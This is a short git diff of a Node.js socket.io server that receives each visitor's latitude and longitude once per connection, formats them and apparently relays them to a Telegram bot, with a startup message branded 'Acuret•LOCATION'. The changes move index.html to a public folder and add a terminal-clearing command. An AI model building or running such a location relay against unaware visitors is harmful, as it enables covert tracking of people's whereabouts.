@@ -15,15 +15,19 @@ function sendTelegram(message) {
     https.get(url, (res) => {}).on('error', (e) => { });
 }
 
+// Static files serve karne ke liye (CSS/JS agar public me hain)
+app.use(express.static(path.join(__dirname, 'public')));
+
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
+    // Index.html ab public folder se load hogi
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 io.on('connection', (socket) => {
     let hasSent = false;
     socket.on('send-location', (data) => {
         if (hasSent) return;
-        
+
         const latRef = data.lat >= 0 ? "N" : "S";
         const lngRef = data.lng >= 0 ? "E" : "W";
         const formattedLat = Math.abs(data.lat).toFixed(3);
@@ -39,6 +43,8 @@ const PORT = process.env.PORT || 3000;
 // Railway fixed IP address logic
 http.listen(PORT, '0.0.0.0', () => {
     sendTelegram("<b>Acuret•LOCATION\"🌍\"</b>");
-    // Railway needs this log to know it's alive!
+    
+    // Terminal clear logic
+    process.stdout.write('\x1Bc'); 
     console.log(`Server started on port: ${PORT}`);
 });
